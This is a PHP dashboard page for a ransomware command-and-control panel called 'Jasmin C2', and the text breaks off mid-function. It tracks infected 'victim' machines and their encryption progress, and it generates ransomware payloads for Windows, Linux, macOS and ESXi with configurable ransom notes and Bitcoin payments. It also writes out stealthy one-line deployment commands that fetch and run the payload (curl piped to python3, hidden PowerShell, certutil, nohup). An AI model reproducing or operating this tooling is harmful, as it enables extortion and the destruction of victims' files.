<?php
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
include __DIR__ . '/database/db_conection.php';

$records_per_page = 10;
$pageno = max(1, intval($_GET['pageno'] ?? 1));
$search = trim($_GET['search'] ?? '');
$offset = ($pageno - 1) * $records_per_page;

if ($search !== '') {
    $like = '%' . $search . '%';
    $count_stmt = $pdo->prepare('SELECT COUNT(*) FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6');
    $count_stmt->execute([':s1'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like,':s5'=>$like,':s6'=>$like]);
    $total_rows = (int)$count_stmt->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6 ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':s1',$like);$data_stmt->bindValue(':s2',$like);$data_stmt->bindValue(':s3',$like);
    $data_stmt->bindValue(':s4',$like);$data_stmt->bindValue(':s5',$like);$data_stmt->bindValue(':s6',$like);
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
} else {
    $total_rows = (int)$pdo->query('SELECT COUNT(*) FROM victims')->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
}
$total_pages = max(1,(int)ceil($total_rows/$records_per_page));
if ($pageno > $total_pages) $pageno = $total_pages;
$rows = $data_stmt->fetchAll();
// 全库是否有进行中任务（跨分页），决定是否自动刷新进度条
$has_active = false;
try {
    $has_active = (int)$pdo->query('SELECT COUNT(*) FROM victims WHERE is_complete = 0')->fetchColumn() > 0;
} catch (PDOException $e) { $has_active = false; }
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
$csrf = csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Jasmin C2</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="./assets/css/dashboard.css">
</head>
<body>
<nav class="sidebar" id="sidebar">
  <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
  <a href="dashboard.php" class="nav-item active"><i class="fas fa-chart-pie"></i><span>仪表盘</span></a>
  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>载荷生成</span></a>
  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>受害主机</span></a>
  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>系统更新</span></a>
  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>解密教程</span></a>
  <a href="#settings" class="nav-item" onclick="showTab('settings')"><i class="fas fa-user-cog"></i><span>账户设置</span></a>
  <div class="sidebar-foot">
    <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> 退出</a>
  </div>
</nav>
<button class="hamburger" id="ham" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>

<main class="content">
<!-- Stats -->
<section class="stats-row">
  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num"><?=$total_rows?></span><label>已感染</label></div></div>
  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num"><?=$total_pages?></span><label>页数</label></div></div>
  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
</section>

<?php
$server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
// 解密口令: 内嵌进"一键解密"命令，配合 .pem.enc 走 AES-256-CBC 解密链路
// (明文 .pem 与 .key_secret 已被 .htaccess 403，不能直接 curl)
$aes_pwd = is_file(__DIR__.'/payloads/.key_secret') ? trim(file_get_contents(__DIR__.'/payloads/.key_secret')) : 'KEY_NOT_SET';
?>
<!-- 载荷生成器 -->
<section class="panel" id="panel-gen">
<h2><i class="fas fa-virus"></i> 载荷生成器</h2>

<?php
// ── 密钥管理 ────────────────────────────────────────────────
// 早期版本「下载私钥」是 payloads/jasmin_private.pem 直链，被 .htaccess 403 拦截
// 而 download_file.php 当时只放行 passwords/ → 必然「下载失败」。
// 现全部改走需登录的 download_file.php。
$__pdir = __DIR__ . '/payloads';
$__has_key = is_file($__pdir . '/jasmin_private.pem.enc');
$__fp = '';
if ($__has_key) {
    $__pt = @file_get_contents($__pdir . '/jasmin_public.pem');
    if ($__pt !== false) $__fp = substr(hash('sha256', $__pt), 0, 16);
}
$__kfiles = [
    ['payloads/jasmin_private.pem',     '私钥 (.pem 明文)',   'fa-key',           '#ef4444'],
    ['payloads/jasmin_private.pem.enc', '私钥 (AES 加密)',    'fa-lock',          '#f59e0b'],
    ['payloads/.key_secret',            '解密口令',           'fa-unlock-alt',    '#8b5cf6'],
    ['payloads/jasmin_public.pem',      '公钥',               'fa-shield-alt',    '#4dc3fa'],
];
?>
<div class="key-mgr<?= $__has_key ? '' : ' key-mgr-empty' ?>">
  <?php if ($__has_key): ?>
  <div class="key-mgr-head">
    <span class="key-dot"></span> <b>密钥已就绪</b>
    <span class="key-fp">公钥指纹 SHA256: <?= h($__fp) ?>…</span>
  </div>
  <div class="key-mgr-btns">
    <?php foreach ($__kfiles as [$__f, $__label, $__icon, $__color]):
      $__exists = is_file(__DIR__ . '/' . $__f); ?>
      <?php if ($__exists): ?>
      <a class="btn btn-red key-btn" style="background:<?= $__color ?>" href="download_file.php?file=<?= urlencode($__f) ?>">
        <i class="fas <?= $__icon ?>"></i> 下载<?= $__label ?>
      </a>
      <?php endif; ?>
    <?php endforeach; ?>
  </div>
  <div class="key-mgr-note">
    <i class="fas fa-info-circle"></i>
    受害者端解密：用 <code>.pem.enc</code> + <code>解密口令</code>（AES-256-CBC 解出 .pem）走加密链路；
    或直接用<b>明文私钥</b> <code>sh jasmin_decrypt_openssl.sh key.pem /</code>。
    口令与明文私钥仅能在登录后台后下载，直接 URL 访问一律 403。
  </div>
  <?php else: ?>
  <div class="key-mgr-head"><span class="key-dot off"></span> <b>尚未生成密钥对</b>
    <span class="key-fp">生成后才能加密数据 —— 请点击下方「生成RSA密钥对」</span></div>
  <?php endif; ?>
</div>


<div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($server_url)?>/handshake.php"></div>
  <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
  <div class="field"><label>目标系统</label>
    <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
      <option value="win">🖥️ Windows (C# / .NET)</option>
      <option value="linux">🐧 Linux (Python3)</option>
      <option value="macos">🍎 macOS (Python3)</option>
      <option value="esxi">🖥️ VMware ESXi (Shell)</option>
    </select>
  </div>
</div>

<h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="Email / Telegram / Bitcoin address"></div>
</div>
<div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">All your files have been encrypted with AES-256 + RSA-2048 military-grade encryption.
Each file has its own unique key, protected by an RSA public key.
Do NOT rename or delete .jasmin files. Do NOT use third-party recovery tools.
Contact us to obtain the private key and restore your files.</textarea>
</div>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="e.g. 0.5 BTC / $5000 USDT"></div>
  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC / ETH / USDT address"></div>
</div>

<div style="display:flex;gap:10px;margin-top:16px">
  <button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button>
  <button class="btn btn-red" style="background:#10b981" onclick="genKey()"><i class="fas fa-key"></i> 生成RSA密钥对</button>
</div>
<div id="key-result" class="gen-result" style="margin-top:10px"></div>
<div id="gen-result" class="gen-result" style="margin-top:16px"></div>
</section>

<!-- Victims -->
<section class="panel" id="panel-victims">
<h2><i class="fas fa-desktop"></i> Victims</h2>
<form action="dashboard.php" method="get" class="search-form">
  <input type="text" name="search" placeholder="搜索主机名、IP、系统、位置..." value="<?=h($search)?>">
  <button type="submit"><i class="fas fa-search"></i></button>
</form>
<div class="table-wrap"><table>
<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>加密进度</th><th>文件类型</th><th>操作</th></tr></thead>
<tbody>
<?php if(empty($rows)):?>
<tr><td colspan="11" class="empty">暂无受害主机数据</td></tr>
<?php else: foreach($rows as $i=>$row):
  $sm=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['machine_name']);
  $su=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['computer_user']);
  $ss=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['systemid']);
  $nt=date("H-i-s",strtotime($row['time']));
  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
  $ec=intval($row['encrypted_count']??0);
  $es=intval($row['encrypted_size']??0);
  $et=h($row['encrypted_types']??'');
  $ed=h($row['encrypted_detail']??'{}');
  if($es>=1073741824)$sz_str=round($es/1073741824,2).' GB';
  elseif($es>=1048576)$sz_str=round($es/1048576,2).' MB';
  elseif($es>=1024)$sz_str=round($es/1024,2).' KB';
  else $sz_str=$es.' B';
  $vid=$row['id'];
  $is_linux=(stripos($row['os']??'','linux')!==false||stripos($row['os']??'','darwin')!==false);
  // ── 加密进度 ──
  $tc=intval($row['total_count']??0);
  $ts=intval($row['total_size']??0);
  $ic=intval($row['is_complete']??1);
  if($ts>0)$pct=(int)round($es*100/$ts);
  elseif($tc>0)$pct=(int)round($ec*100/$tc);
  else $pct=$ic?100:0;
  $pct=max(0,min(100,$pct));
  if($ts>=1073741824)$ts_str=round($ts/1073741824,2).' GB';
  elseif($ts>=1048576)$ts_str=round($ts/1048576,2).' MB';
  elseif($ts>=1024)$ts_str=round($ts/1024,2).' KB';
  else $ts_str=$ts.' B';
?>
<tr>
  <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
  <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
  <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"><?=$ec?> 个</a></td>
  <td style="color:#4dc3fa"><?=$sz_str?></td>
  <td style="min-width:150px">
    <div style="display:flex;align-items:center;gap:8px">
      <div style="flex:1;background:#1e293b;border-radius:6px;height:10px;overflow:hidden;min-width:78px">
        <div style="height:10px;width:<?=$pct?>%;border-radius:6px;transition:width .6s;background:<?=$ic?'linear-gradient(90deg,#10b981,#34d399)':'linear-gradient(90deg,#f59e0b,#ef4444)'?>"></div>
      </div>
      <span style="font-size:.74rem;font-weight:600;color:<?=$ic?'#10b981':'#f59e0b'?>;white-space:nowrap;min-width:34px;text-align:right"><?=$pct?>%</span>
    </div>
    <div style="font-size:.68rem;color:#64748b;margin-top:3px;white-space:nowrap">
      <?=$ec?>/<?=$tc>0?$tc:'?'?> 个 · <?=$sz_str?><?php if($ts>0):?> / <?=$ts_str?><?php endif;?>
      <?php if(!$ic):?><span style="color:#f59e0b">● 加密中</span><?php else:?><span style="color:#10b981">✓ 完成</span><?php endif;?>
    </div>
  </td>
  <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
  <td style="white-space:nowrap">
    <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('<?=$vid?>','<?=h($row['ip'])?>',<?=$is_linux?'true':'false'?>)" title="一键解密"><i class="fas fa-unlock"></i></button>
  </td>
</tr>
<?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
<tr><td colspan="11" id="dec-row-<?=$vid?>" class="dec-expand">
<?php if($is_linux):?>
<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 openssl 零依赖
curl -sL <?=$server_url?>/payloads/jasmin_unlock.sh | sh -s <?=$server_url?> "<?=$aes_pwd?>" /path/to/decrypt
# 末尾换成要解密的目录，不写则解密当前目录</pre>
<?php else:?>
<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密 — 纯 PowerShell，无需编译 exe
:: 要求 PowerShell 7+  (未装可执行: winget install Microsoft.PowerShell)
curl.exe -sL <?=$server_url?>/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
pwsh -File jasmin_unlock.ps1 -Server <?=$server_url?> -K "<?=$aes_pwd?>" -Paths C:\path\to\decrypt
:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
<?php endif;?>
</td></tr>
<?php endif;?>
<?php endforeach;endif;?>
</tbody></table></div>
<?php if($total_pages>1):?>
<nav class="pagination">
  <a href="?search=<?=urlencode($search)?>&pageno=1" <?=$pageno<=1?'class="disabled"':''?>>&laquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=max(1,$pageno-1)?>" <?=$pageno<=1?'class="disabled"':''?>>&lsaquo;</a>
  <?php $s2=max(1,$pageno-3);$e2=min($total_pages,$pageno+3);for($p=$s2;$p<=$e2;$p++):?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$p?>" <?=$p===$pageno?'class="active"':''?>><?=$p?></a>
  <?php endfor;?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=min($total_pages,$pageno+1)?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&rsaquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$total_pages?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&raquo;</a>
</nav>
<?php endif;?>
</section>

<!-- 账户设置面板 -->
<section class="panel" id="panel-settings" style="display:none">
  <h2><i class="fas fa-user-cog"></i> 账户设置</h2>
  <div class="pw-acct"><i class="fas fa-user-shield"></i> 当前账号: <b><?=h($_SESSION['username'])?></b></div>
  <div class="pw-form">
    <div class="field"><label>当前密码</label>
      <input type="password" id="pw-cur" autocomplete="current-password" placeholder="输入当前密码以验证身份"></div>
    <div class="field"><label>新密码</label>
      <input type="password" id="pw-new" autocomplete="new-password" placeholder="至少 8 位" oninput="pwStrength()">
      <div class="pw-strength"><div id="pw-bar"></div></div>
      <div class="pw-meta"><span id="pw-label">强度: —</span><span id="pw-len">0 字符</span></div>
    </div>
    <div class="field"><label>确认新密码</label>
      <input type="password" id="pw-new2" autocomplete="new-password" placeholder="再次输入新密码"></div>
    <div class="pw-hint">
      · 至少 8 位<br>
      · 需包含小写字母、大写字母、数字、符号中的<b>至少两类</b><br>
      · 不能与当前密码相同
    </div>
    <button class="btn btn-red" onclick="submitPassword()"><i class="fas fa-key"></i> 修改密码</button>
    <div id="pw-result"></div>
  </div>
</section>

<!-- 解密教程面板 -->
<?php include __DIR__ . '/includes/decrypt_panel.html'; ?>
</main>

<!-- Update Panel (hidden by default) -->
<script>
// inject update panel into main before script
(function(){
  var main=document.querySelector('.content');
  var sec=document.createElement('section');
  sec.className='panel';sec.id='panel-update';sec.style.display='none';
  sec.innerHTML='<h2><i class="fas fa-cloud-download-alt"></i> 检查更新</h2>'
    +'<p style="color:#94a3b8;margin-bottom:16px">当前版本: <b style="color:#4dc3fa"><?php $v=__DIR__."/../VERSION";if(!file_exists($v))$v=__DIR__."/VERSION";echo trim(@file_get_contents($v)?:"0.0.0");?></b></p>'
    +'<button class="btn btn-red" onclick="checkUpdate()"><i class="fas fa-sync-alt"></i> 检查更新</button>'
    +'<div id="update-result" style="margin-top:16px"></div>';
  main.appendChild(sec);
})();

function checkUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
  fetch('update.php?action=check').then(x=>x.json()).then(d=>{
    if(!d.ok||!d.update){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 (v'+d.current+')</div>';return;}
    var info='远程版本: <b>v'+d.latest+'</b>';
    if(d.latest_commit)info+=' | 提交: '+d.latest_commit+' — '+d.message;
    if(d.date)info+='<br>时间: '+d.date;
    r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 发现新版本<br>'+info
      +'<br><br><button class="btn btn-red" onclick="doUpdate()"><i class="fas fa-download"></i> 一键更新</button></div>';
  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
}
function doUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
  fetch('update.php?action=update').then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="dashboard.php" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
}

function showDT(t){
  document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
  document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
  var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
  event.target.classList.add('active');
}

function showTab(t){
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  event.target.closest('.nav-item').classList.add('active');
}
var _detOpen=null;
function showFileDetail(vid,jsonStr){
  if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==vid){_detOpen=null;return;}_detOpen=null;}
  var d;try{d=JSON.parse(jsonStr);}catch(e){d={};}
  var keys=Object.keys(d).sort();
  if(!keys.length){return;}
  function fmtSz(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+' GB';if(b>=1048576)return (b/1048576).toFixed(2)+' MB';if(b>=1024)return (b/1024).toFixed(2)+' KB';return b+' B';}
  var h='<table style="width:100%;font-size:.8rem;border-collapse:collapse"><thead><tr style="color:var(--accent2)"><th style="text-align:left;padding:6px 10px">文件类型</th><th style="text-align:right;padding:6px 10px">数量</th><th style="text-align:right;padding:6px 10px">大小</th><th style="padding:6px 10px">占比</th></tr></thead><tbody>';
  var total=0;keys.forEach(function(k){total+=d[k].count;});
  keys.forEach(function(k){
    var pct=total?Math.round(d[k].count/total*100):0;
    var bar='<div style="background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block"><div style="background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%"></div></div>';
    h+='<tr style="border-top:1px solid var(--border)"><td style="padding:5px 10px;color:#f59e0b;font-weight:600">'+k+'</td><td style="text-align:right;padding:5px 10px">'+d[k].count+' 个</td><td style="text-align:right;padding:5px 10px;color:#4dc3fa">'+fmtSz(d[k].size)+'</td><td style="padding:5px 10px">'+bar+' '+pct+'%</td></tr>';
  });
  h+='</tbody></table>';
  var btns=document.querySelectorAll('a[onclick*="showFileDetail"]');
  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf(vid+',' )>-1){tr=b.closest('tr');break;}}
  if(!tr)return;
  var nr=document.createElement('tr');nr.dataset.vid=vid;
  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.innerHTML=h;
  nr.appendChild(td);tr.after(nr);_detOpen=nr;
}

var _decOpen=null;
var _aesKey='<?php echo file_exists(__DIR__."/payloads/.key_secret")?trim(file_get_contents(__DIR__."/payloads/.key_secret")):"KEY_NOT_SET";?>';
function showDecrypt(vid,ip,isLinux){
  var srv=location.origin;var k=_aesKey;
  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
  var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
  if(!tr)return;
  var nr=document.createElement('tr');nr.dataset.vid=vid;
  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
  if(isLinux){
    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' \"'+k+'\" /path/to/decrypt\\n# 末尾换成要解密的目录，不写则解密当前目录</pre>';
  }else{
    td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+  (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
  }
  nr.appendChild(td);tr.after(nr);_decOpen=nr;
}

function genKey(){
  var r=document.getElementById('key-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
  fetch('keygen.php',{method:'POST',body:new URLSearchParams({csrf_token:'<?=$csrf?>'})}).then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="download_file.php?file=payloads%2Fjasmin_private.pem" class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="download_file.php?file=payloads%2Fjasmin_private.pem.enc" class="btn btn-red" style="display:inline-flex;background:#f59e0b"><i class="fas fa-lock"></i> 下载加密私钥</a> <a href="download_file.php?file=payloads%2F.key_secret" class="btn btn-red" style="display:inline-flex;background:#8b5cf6"><i class="fas fa-unlock-alt"></i> 下载解密口令</a> <a href="download_file.php?file=payloads%2Fjasmin_public.pem" class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a> <span style="font-size:.76rem;color:#94a3b8;margin-left:10px">刷新页面可见顶部「密钥管理」</span></div></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
}

function genPayload(){
  var p=document.getElementById('gen-platform').value;
  var c2=document.getElementById('c2url').value;
  var sec=document.getElementById('gensecret').value;
  var res=document.getElementById('gen-result');
  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成 '+p+' 载荷...</span>';
  var fd=new FormData();
  fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
  fd.append('ransom_title',document.getElementById('ransom-title').value);
  fd.append('ransom_contact',document.getElementById('ransom-contact').value);
  fd.append('ransom_body',document.getElementById('ransom-body').value);
  fd.append('ransom_price',document.getElementById('ransom-price').value);
  fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
  fetch('generate.php',{method:'POST',body:fd})
  .then(r=>r.json()).then(d=>{
    if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
    var pname={'win':'Windows','linux':'Linux','macos':'macOS','esxi':'VMware ESXi'}[p]||p;
    var dl='payloads/'+d.file;
    var html='<div class="gen-ok">';
    html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
    html+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
    html+='<h4 style="color:var(--accent2);margin-bottom:10px"><i class="fas fa-terminal"></i> 一键部署命令</h4>';
    if(p==='linux'||p==='macos'){
      var rurl=location.origin+'/'+dl;
      html+='<pre class="dt-code" style="margin:0">'+
        '# 方式1: curl 直接运行\n'+
        'curl -sL '+rurl+' | python3\n\n'+
        '# 方式2: wget 下载后运行\n'+
        'wget -q '+rurl+' -O /tmp/.j && python3 /tmp/.j && rm -f /tmp/.j\n\n'+
        '# 方式3: 后台静默运行\n'+
        'nohup python3 -c \"$(curl -sL '+rurl+')\" > /dev/null 2>&1 &'+
        '</pre>';
    }else if(p==='esxi'){
      var rurl=location.origin+'/'+dl;
      html+='<pre class="dt-code" style="margin:0">'+
        '# ESXi SSH 一键部署\n'+
        '# 1. 启用 ESXi SSH (Host > Actions > Services > Enable SSH)\n\n'+
        '# 方式1: wget (ESXi 自带 BusyBox wget)\n'+
        'wget -q '+rurl+' -O /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n'+
        '# 方式2: curl (部分版本支持)\n'+
        'curl -sL '+rurl+' -o /tmp/.jsh && sh /tmp/.jsh && rm -f /tmp/.jsh\n\n'+
        '# 方式3: 后台运行\n'+
        'wget -q '+rurl+' -O /tmp/.jsh && nohup sh /tmp/.jsh > /dev/null 2>&1 &'+
        '</pre>';
    }else{
      html+='<pre class="dt-code" style="margin:0">'+
        ':: 方式1: PowerShell 下载运行\n'+
        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\\\j.cs; '+
        'cd $env:TEMP; csc /target:winexe /out:j.exe j.cs; Start-Process j.exe\"\n\n'+
        ':: 方式2: certutil 下载\n'+
        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\\\j.cs && csc /target:winexe /out:%TEMP%\\\\j.exe %TEMP%\\\\j.cs && %TEMP%\\\\j.exe'+
        '</pre>';
    }
    html+='</div></div>';
    res.innerHTML=html;
  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+e+'</div>';});
}

// ── 修改密码 ──
function pwStrength(){
  var v=document.getElementById('pw-new').value;
  var classes=0;
  if(/[a-z]/.test(v))classes++;
  if(/[A-Z]/.test(v))classes++;
  if(/[0-9]/.test(v))classes++;
  if(/[^a-zA-Z0-9]/.test(v))classes++;
  var score=0;
  if(v.length>=8)score++;
  if(v.length>=12)score++;
  if(classes>=2)score++;
  if(classes>=3)score++;
  if(classes>=4&&v.length>=12)score++;
  var map=[
    {w:'0%',c:'transparent',t:'—'},
    {w:'22%',c:'#ef4444',t:'很弱'},
    {w:'45%',c:'#f59e0b',t:'弱'},
    {w:'70%',c:'#eab308',t:'中等'},
    {w:'90%',c:'#10b981',t:'强'},
    {w:'100%',c:'#059669',t:'很强'}
  ];
  var m=map[Math.min(score,5)];
  document.getElementById('pw-bar').style.width=m.w;
  document.getElementById('pw-bar').style.background=m.c;
  document.getElementById('pw-label').textContent='强度: '+m.t;
  document.getElementById('pw-len').textContent=v.length+' 字符';
}
function submitPassword(){
  var r=document.getElementById('pw-result');
  var cur=document.getElementById('pw-cur').value;
  var nw=document.getElementById('pw-new').value;
  var nw2=document.getElementById('pw-new2').value;
  if(!cur||!nw||!nw2){r.innerHTML='<span style="color:#ef4444"><i class="fas fa-exclamation-circle"></i> 请填写全部字段</span>';return;}
  if(nw!==nw2){r.innerHTML='<span style="color:#ef4444"><i class="fas fa-exclamation-circle"></i> 两次输入的新密码不一致</span>';return;}
  if(nw.length<8){r.innerHTML='<span style="color:#ef4444"><i class="fas fa-exclamation-circle"></i> 新密码至少 8 位</span>';return;}
  r.innerHTML='<span style="color:#94a3b8"><i class="fas fa-spinner fa-spin"></i> 提交中…</span>';
  var fd=new URLSearchParams({
    current_password:cur,new_password:nw,confirm_password:nw2,csrf_token:'<?=$csrf?>'});
  fetch('change_password.php',{method:'POST',body:fd,credentials:'same-origin'})
    .then(function(x){return x.json();})
    .then(function(j){
      if(j.ok){
        r.innerHTML='<span style="color:#10b981"><i class="fas fa-check-circle"></i> '+j.msg+'</span>';
        ['pw-cur','pw-new','pw-new2'].forEach(function(id){document.getElementById(id).value='';});
        pwStrength();
        setTimeout(function(){location.href='logout.php';},2000);
      }else{
